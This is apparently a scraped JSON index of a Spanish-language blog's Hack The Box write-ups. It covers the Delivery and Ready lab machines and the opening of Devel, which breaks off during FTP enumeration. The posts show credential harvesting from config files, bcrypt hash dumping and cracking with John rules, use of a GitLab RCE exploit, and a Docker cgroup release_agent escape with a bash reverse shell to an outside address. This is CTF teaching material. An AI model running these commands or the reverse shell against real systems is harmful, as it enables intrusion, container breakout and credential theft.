Feb 10 18:33:37 2021 -- 1 IP address (1 host up) scanned in 166.34 seconds # Nmap 7.80 scan initiated Wed Feb 10 18:34:08 2021 as: nmap -p 22,80,8065 -sV -sC -oN serviceports delivery.htb Nmap scan report for delivery.htb (10.10.10.222) Host is up (0.44s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache, max-age=31556926, public | Content-Length: 3108 | Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; cdn.rudderlabs.com | Content-Type: text/html; charset=utf-8 | Last-Modified: Wed, 10 Feb 2021 17:44:49 GMT | X-Frame-Options: SAMEORIGIN | X-Request-Id: t3i5h6aemfgxj8mhzygap77tdo | X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false | Date: Wed, 10 Feb 2021 23:37:10 GMT | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;robots\u0026#34; content=\u0026#34;noindex, nofollow\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;no-referrer\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Mattermost\u0026lt;/title\u0026gt;\u0026lt;meta name=\u0026#34;mobile-web-app-capable\u0026#34; content=\u0026#34;yes\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;application-name\u0026#34; content=\u0026#34;Mattermost\u0026#34;\u0026gt;\u0026lt;meta name=\u0026#34;format-detection\u0026#34; content=\u0026#34;telephone=no\u0026#34;\u0026gt;\u0026lt;link re | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Date: Wed, 10 Feb 2021 23:37:11 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8065-TCP:V=7.80%I=7%D=2/10%Time=60246D78%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\u0026#34;)%r(GetRequest,DF3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nAccept-Ranges:\\ SF:x20bytes\\r\\nCache-Control:\\x20no-cache,\\x20max-age=31556926,\\x20public\\ SF:r\\nContent-Length:\\x203108\\r\\nContent-Security-Policy:\\x20frame-ancesto SF:rs\\x20\u0026#39;self\u0026#39;;\\x20script-src\\x20\u0026#39;self\u0026#39;\\x20cdn\\.rudderlabs\\.com\\r\\nConten SF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\nLast-Modified:\\x20Wed,\\x2010\\ SF:x20Feb\\x202021\\x2017:44:49\\x20GMT\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\n SF:X-Request-Id:\\x20t3i5h6aemfgxj8mhzygap77tdo\\r\\nX-Version-Id:\\x205\\.30\\. SF:0\\.5\\.30\\.1\\.57fb31b889bf81d99d8af8176d4bbaaa\\.false\\r\\nDate:\\x20Wed,\\x SF:2010\\x20Feb\\x202021\\x2023:37:10\\x20GMT\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x SF:20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;viewport SF:\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,initial-scale=1,maximum-scale=1,user SF:-scalable=0\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;robots\\\u0026#34;\\x20content=\\\u0026#34;noindex,\\x20nofollo SF:w\\\u0026#34;\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;referrer\\\u0026#34;\\x20content=\\\u0026#34;no-referrer\\\u0026#34;\u0026gt;\u0026lt;title\u0026gt;Matter SF:most\u0026lt;/title\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;mobile-web-app-capable\\\u0026#34;\\x20content=\\\u0026#34;yes\\\u0026#34; SF:\u0026gt;\u0026lt;meta\\x20name=\\\u0026#34;application-name\\\u0026#34;\\x20content=\\\u0026#34;Mattermost\\\u0026#34;\u0026gt;\u0026lt;meta\\x20 SF:name=\\\u0026#34;format-detection\\\u0026#34;\\x20content=\\\u0026#34;telephone=no\\\u0026#34;\u0026gt;\u0026lt;link\\x20re\u0026#34;)%r(H SF:TTPOptions,5B,\u0026#34;HTTP/1\\.0\\x20405\\x20Method\\x20Not\\x20Allowed\\r\\nDate:\\x2 SF:0Wed,\\x2010\\x20Feb\\x202021\\x2023:37:11\\x20GMT\\r\\nContent-Length:\\x200\\r SF:\\n\\r\\n\u0026#34;)%r(RTSPRequest,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConten SF:t-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n SF:400\\x20Bad\\x20Request\u0026#34;)%r(Help,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close SF:\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(SSLSessionReq,67,\u0026#34;HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nCon SF:nection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34;)%r(TerminalServerCookie SF:,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain; SF:\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\u0026#34; SF:); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Feb 10 18:35:45 2021 -- 1 IP address (1 host up) scanned in 97.53 seconds HTTP Encontramos una pagina corriendo en el puerto 80 la cual muestra un nuevo subdominio helpdesk.delivery.htb y un link de referencia hacia el puerto 8065 de MatterMost server. En la pagina menciona que debemos de tener una cuenta en helpdesk para acceder a Mattermost (Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.).\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos, pero la pagina al parecer solo es una pagina estatica sin más.\n1 2 3 4 5 6 7 8 9 10 11 12 [?] Started at\t: 2021-02-10 18:38:43 GET\t200 OK\thttp://delivery.htb/ GET 200 OK http://delivery.htb/index.html GET 301 Moved Permanently http://delivery.htb/images =\u0026gt; http://delivery.htb/images/ GET 301 Moved Permanently http://delivery.htb/assets =\u0026gt; http://delivery.htb/assets/ GET 301 Moved Permanently http://delivery.htb/error =\u0026gt; http://delivery.htb/error/ GET 200 OK http://delivery.htb/ [?] Ended at: 2021-02-10 21:28:42 Mattermost En el puerto 8065 encontramos el login de Mattermost.\nUSER osTicket Con el nuevo subdominio agregado a nuestro archivo /etc/hosts encontramos osTicket, osTicket es un sistema de soporte que administra solicitudes de soporte, y, por usuario crea un email para que éste pueda revisar el status del ticket enviado, al investigar posibles vulnerabilidades encontramos una: SSRF aunque no es fue de ayuda.\nosTicket \u0026gt; Mattermost En la pagina \u0026ldquo;estatica\u0026rdquo; se mencionaba que para aquellos usuarios que no se han registrado, deben realizarlo a traves de HelpDesk (helpdesk.delivery.htb - osTicket), una vez registrado pueden acceder a MatterMost, por lo que creamos un ticket en osTicket, al finalizar, nos muestra un mensaje con el id del ticket y un correo generado.\nEl correo \u0026ldquo;generado\u0026rdquo; es el que debemos de utilizar para crear nuestra cuenta en MatterMost, MatterMost enviará el link de activacion a nuestro \u0026rsquo;ticket\u0026rsquo; en osTicket.\nSi verificamos el ticket (utilizando el correo con el que se registro el ticket y el id del ticket generado) vemos que recibimos el correo con el link para activar la cuenta.\nIngresamos a MatterMost y vemos el unico chat publico con algunos comentarios, en donde mencionan las credenciales del servidor, y que, se desarrolle un programa para que se dejen de reutilizar contraseñas especialmente los que contengan \u0026quot;PleaseSubscribe!\u0026quot;, tambien que si alguien logran obtener los hashes, facilmente puede obtener en texto plano el valor del hash utilizando reglas de hashcat.\nosTicket Panel Ingresamos al panel (de agentes) de osTicket utilizando las credenciales encontradas en MatterMost donde vemos la lista de tickets creados, en este panel no encontramos mucho por hacer.\nSSH Utilizamos las credenciales en el servicio de SSH donde logramos obtener una shell y nuestra flag user.txt.\nROOT Realizamos una enumeracion y vemos que mysql está corriendo en el puerto 3306, además encontramos las credenciales para la base de datos de osTicket, al ingresar vemos la informacion perteneciente a osTicket.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 maildeliverer@Delivery:/var/www/osticket/upload$ cat ./include/ost-config.php \u0026lt;?php [... REDACTED ...] # Encrypt/Decrypt secret key - randomly generated during installation. define(\u0026#39;SECRET_SALT\u0026#39;,\u0026#39;nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3\u0026#39;); #Default admin email. Used only on db connection issues and related alerts. define(\u0026#39;ADMIN_EMAIL\u0026#39;,\u0026#39;maildeliverer@delivery.htb\u0026#39;); # Database Options # --------------------------------------------------- # Mysql Login info define(\u0026#39;DBTYPE\u0026#39;,\u0026#39;mysql\u0026#39;); define(\u0026#39;DBHOST\u0026#39;,\u0026#39;localhost\u0026#39;); define(\u0026#39;DBNAME\u0026#39;,\u0026#39;osticket\u0026#39;); define(\u0026#39;DBUSER\u0026#39;,\u0026#39;ost_user\u0026#39;); define(\u0026#39;DBPASS\u0026#39;,\u0026#39;!H3lpD3sk123!\u0026#39;); [... REDACTED ...] Tambien encontramos la configuracion y credenciales de la base de datos de MatterMost, en la base de datos encontramos contraseñas encriptadas de los usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 maildeliverer@Delivery:/opt/mattermost/config$ cat config.json [... REDACTED ...] \u0026#34;SqlSettings\u0026#34;: { \u0026#34;DriverName\u0026#34;: \u0026#34;mysql\u0026#34;, \u0026#34;DataSource\u0026#34;: \u0026#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\\u0026readTimeout=30s\\u0026writeTimeout=30s\u0026#34;, \u0026#34;DataSourceReplicas\u0026#34;: [], \u0026#34;DataSourceSearchReplicas\u0026#34;: [], \u0026#34;MaxIdleConns\u0026#34;: 20, \u0026#34;ConnMaxLifetimeMilliseconds\u0026#34;: 3600000, \u0026#34;MaxOpenConns\u0026#34;: 300, \u0026#34;Trace\u0026#34;: false, \u0026#34;AtRestEncryptKey\u0026#34;: \u0026#34;n5uax3d4f919obtsp1pw1k5xetq1enez\u0026#34;, \u0026#34;QueryTimeout\u0026#34;: 30, \u0026#34;DisableDatabaseSearch\u0026#34;: false }, [... REDACTED ...] MariaDB [mattermost]\u0026gt; describe Users; +--------------------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +--------------------+--------------+------+-----+---------+-------+ | Id | varchar(26) | NO | PRI | NULL | | | CreateAt | bigint(20) | YES | MUL | NULL | | | UpdateAt | bigint(20) | YES | MUL | NULL | | | DeleteAt | bigint(20) | YES | MUL | NULL | | | Username | varchar(64) | YES | UNI | NULL | | | Password | varchar(128) | YES | | NULL | | | AuthData | varchar(128) | YES | UNI | NULL | | | AuthService | varchar(32) | YES | | NULL | | | Email | varchar(128) | YES | UNI | NULL | | | EmailVerified | tinyint(1) | YES | | NULL | | | Nickname | varchar(64) | YES | | NULL | | | FirstName | varchar(64) | YES | | NULL | | | LastName | varchar(64) | YES | | NULL | | | Position | varchar(128) | YES | | NULL | | | Roles | text | YES | | NULL | | | AllowMarketing | tinyint(1) | YES | | NULL | | | Props | text | YES | | NULL | | | NotifyProps | text | YES | | NULL | | | LastPasswordUpdate | bigint(20) | YES | | NULL | | | LastPictureUpdate | bigint(20) | YES | | NULL | | | FailedAttempts | int(11) | YES | | NULL | | | Locale | varchar(5) | YES | | NULL | | | Timezone | text | YES | | NULL | | | MfaActive | tinyint(1) | YES | | NULL | | | MfaSecret | varchar(128) | YES | | NULL | | +--------------------+--------------+------+-----+---------+-------+ 25 rows in set (0.002 sec) MariaDB [mattermost]\u0026gt; MariaDB [mattermost]\u0026gt; select Username, Password, Email, Nickname from Users; +----------------------------------+--------------------------------------------------------------+-------------------------+----------+ | Username | Password | Email | Nickname | +----------------------------------+--------------------------------------------------------------+-------------------------+----------+ | surveybot | | surveybot@localhost | | | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | 4120849@delivery.htb | | | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | 7466068@delivery.htb | | | sckull | $2a$10$AP5Rh.y5nEnGdbYFaZpTU.eSogx.U4k1dYqnGik3HGdD4HPjD/miK | sckull@sckull.com | | | root | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | root@delivery.htb | | | spirit | $2a$10$38hHVUzGTxHmKQ.QKQtRGuiT1cdmjUOo/QXUJZjK1zJGJMVpmObWC | 4300590@delivery.htb | | | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | 9122359@delivery.htb | | | channelexport | | channelexport@localhost | | | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | 5056505@delivery.htb | | +----------------------------------+--------------------------------------------------------------+-------------------------+----------+ 10 rows in set (0.001 sec) JOHN + RULES \u0026gt; SHELL Como bien el usuario root daba a entender que reutilizaban contraseñas y menciona PleaseSubscribe!, utilizamos john y la regla Jumbo para crear un diccionario a partir de esta palabra, ejecutamos john con este nuevo diccionario y logramos encontrar una contraseña la cual utilizamos para obtener una shell con el usuario root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 kali@kali:~/htb/delivery$ echo \u0026#34;PleaseSubscribe!\u0026#34; \u0026gt; part_pass kali@kali:~/htb/delivery$ cat part_pass PleaseSubscribe! kali@kali:~/htb/delivery$ kali@kali:~/htb/delivery$ john --wordlist:part_pass --rules:Jumbo --stdout \u0026gt; possible.txt Using default input encoding: UTF-8 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 70166p 0:00:00:00 100.00% (2021-02-11 00:04) 779622p/s PeSubs kali@kali:~/htb/delivery$ wc -l possible.txt 70166 possible.txt kali@kali:~/htb/delivery$ john --wordlist:possible.txt hash_root Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status PleaseSubscribe!21 (?) 1g 0:00:11:39 DONE (2021-02-11 00:05) 0.001430g/s 100.2p/s 100.2c/s 100.2C/s pleaseSubscribe!..PleaseSubscriman Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/htb/delivery$ ","description":"Delivery expone osTicket el cual nos permitio registrarnos en Mattermost, en este ultimo encontramos credenciales, utilizamos estas para acceder por SSH. Enumeramos la base de datos con credenciales de un archivo de configuracion encontramos hashes que crackeamos con un Wordlist personalizado utilizando reglas de John con informacion de Mattermost, con ello logramos escalar privilegios.","id":62,"section":"posts","tags":["rustbuster","mattermost","osTicket","john","john rules"],"title":"Hack The Box - Delivery","uri":"https://sckull.github.io/posts/delivery/"},{"content":"\rEn Ready encontramos una version de GitLab con una vulnerabilidad que aprovechamos para obtener acceso en un contenedor de Docker. Escalamos privilegios con contraseñas almacenadas, tras una enumeracion encontramos que el contenedor de Docker tiene la flag privileged activado lo que nos dio acceso como root en el Host.\nInformacion de la Maquina Nombre Ready OS Linux Puntos 30 Dificultad Media IP 10.10.10.220 Maker bertolis\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.8, 5.7, 6.6, 3.4, 4.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto ssh (22) y el puerto http (5080) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # Nmap 7.91 scan initiated Tue Feb 16 18:21:59 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.220 Warning: 10.10.10.220 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.220 (10.10.10.220) Host is up (0.098s latency). Not shown: 43467 closed ports, 22066 filtered ports PORT STATE SERVICE 22/tcp open ssh 5080/tcp open onscreen # Nmap done at Tue Feb 16 18:23:06 2021 -- 1 IP address (1 host up) scanned in 66.86 seconds # Nmap 7.91 scan initiated Tue Feb 16 18:23:31 2021 as: nmap -p 22,5080 -sV -sC -oN serviceports 10.10.10.220 Nmap scan report for 10.10.10.220 (10.10.10.220) Host is up (0.070s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 16 18:23:46 2021 -- 1 IP address (1 host up) scanned in 14.65 seconds HTTP Encontramos Gitlab en el puerto http 5080.\nNos registarmos y logramos encontrar que la version es 11.4.7.\nGITLAB RCE - USER [CONTAINER] Realizamos una busqueda de vulnerabilidades para la version de gitlab, encontramos una la cual permite ejecucion remota de comandos, para que funcione requieren de autenticacion, estar registrado en la plataforma.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/htb/ready/exploits] └─$ searchsploit gitlab 11.4.7 ------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------ --------------------------------- GitLab 11.4.7 - RCE (Authenticated) | ruby/webapps/49334.py Gitlab 11.4.7 - Remote Code Execution | ruby/webapps/49257.py GitLab 11.4.7 - Remote Code Execution (Authenticated) | ruby/webapps/49263.py ------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results Utilizamos el primer exploit al cual pasamos los parametros requeridos, logramos obtener una shell con el usuario git y la flag user.txt.\nROOT [CONTAINER] Realizamos una pequeña enumeracion en la maquina, encontramos que el lugar donde estamos es un contenedor docker, tambien una carpeta que contiene el \u0026ldquo;backup\u0026rdquo; de algunos archivos, entre ellos se encuentra el archivo de docker y backups de gitlab.\n1 2 3 4 5 6 7 8 9 ls -lah ls -lah total 112K drwxr-xr-x 2 root root 4.0K Dec 7 09:25 . drwxr-xr-x 1 root root 4.0K Dec 1 16:23 .. -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15K Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 78K Dec 1 19:20 gitlab.rb git@gitlab:/opt/backup$ En el archivo gitlab.rb encontramos una contraseña, utilizamos esta contraseña con el usuario root y logramos obtener una shell root dentro del contenedor.\n1 2 #git@gitlab:/opt/backup$ cat gitlab.rb | grep password |grep -v \u0026#39;^#\u0026#39; #gitlab_rails[\u0026#39;smtp_password\u0026#39;] = \u0026#34;wW59U!ZKMbG9+*#h\u0026#34; PRIVILEGE ESCALATION Como se mencionó, encontramos el archivo del contenedor docker, con la configuracion de los puertos, servicios, red, etc. pero encontramos que el contenedor podria estar corriendo con \u0026ldquo;privilegios\u0026rdquo; (privileged: true).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 version: \u0026#39;2.4\u0026#39; services: web: image: \u0026#39;gitlab/gitlab-ce:11.4.7-ce.0\u0026#39; restart: always hostname: \u0026#39;gitlab.example.com\u0026#39; environment: GITLAB_OMNIBUS_CONFIG: | external_url \u0026#39;http://172.19.0.2\u0026#39; redis[\u0026#39;bind\u0026#39;]=\u0026#39;127.0.0.1\u0026#39; redis[\u0026#39;port\u0026#39;]=6379 gitlab_rails[\u0026#39;initial_root_password\u0026#39;]=File.read(\u0026#39;/root_pass\u0026#39;) networks: gitlab: ipv4_address: 172.19.0.2 ports: - \u0026#39;5080:80\u0026#39; #- \u0026#39;127.0.0.1:5080:80\u0026#39; #- \u0026#39;127.0.0.1:50443:443\u0026#39; #- \u0026#39;127.0.0.1:5022:22\u0026#39; volumes: - \u0026#39;./srv/gitlab/config:/etc/gitlab\u0026#39; - \u0026#39;./srv/gitlab/logs:/var/log/gitlab\u0026#39; - \u0026#39;./srv/gitlab/data:/var/opt/gitlab\u0026#39; - \u0026#39;./root_pass:/root_pass\u0026#39; privileged: true restart: unless-stopped #mem_limit: 1024m networks: gitlab: driver: bridge ipam: config: - subnet: 172.19.0.0/16 Realizamos la \u0026ldquo;explotacion\u0026rdquo; utilizando un PoC descrito en HackTricks con el cual logramos obtener una shell inversa y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # In the container mkdir /tmp/cgrp \u0026amp;\u0026amp; mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026amp;\u0026amp; mkdir /tmp/cgrp/x echo 1 \u0026gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n \u0026#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab` echo \u0026#34;$host_path/cmd\u0026#34; \u0026gt; /tmp/cgrp/release_agent #Reverse shell echo \u0026#39;#!/bin/bash\u0026#39; \u0026gt; /cmd echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1339 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; /cmd chmod a+x /cmd sh -c \u0026#34;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026#34; #head /output ","description":"En Ready encontramos una version de GitLab con una vulnerabilidad que aprovechamos para obtener acceso en un contenedor de Docker. Escalamos privilegios con contraseñas almacenadas, tras una enumeracion encontramos que el contenedor de Docker tiene la flag privileged activado lo que nos dio acceso como root en el Host.","id":63,"section":"posts","tags":["gitlab","gitlab 11.4.7","rce","docker escape","docker","docker breakout"],"title":"Hack The Box - Ready","uri":"https://sckull.github.io/posts/ready/"},{"content":"\rDevel expone un servicio FTP, por medio de este logramos subir una webshell para ejecucion de comandos. Para escalar privilegios obtuvimos informacion del comando systeminfo que posteriormente utilizamos con Windows Exploit Suggester para obtener acceso privilegiado utilizando el exploit MS10-015 con Metasploit.\nInformacion de la Maquina Nombre Devel OS Windows Puntos 20 Dificultad Facil IP 10.10.10.5 Maker ch4p\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.4, 4.7, 6.2, 3.8, 5.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto ftp (21) y el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # Nmap 7.91 scan initiated Tue May 11 01:10:14 2021 as: nmap -Pn -p21,80 -sC -sV -oN port_scan 10.10.10.5 Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.11s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 11 01:10:23 2021 -- 1 IP address (1 host up) scanned in 9.64 seconds FTP Enumeramos el servicio FTP y encontramos archivos y carpetas relacionadas a IIS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 λ ~/htb/devel ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 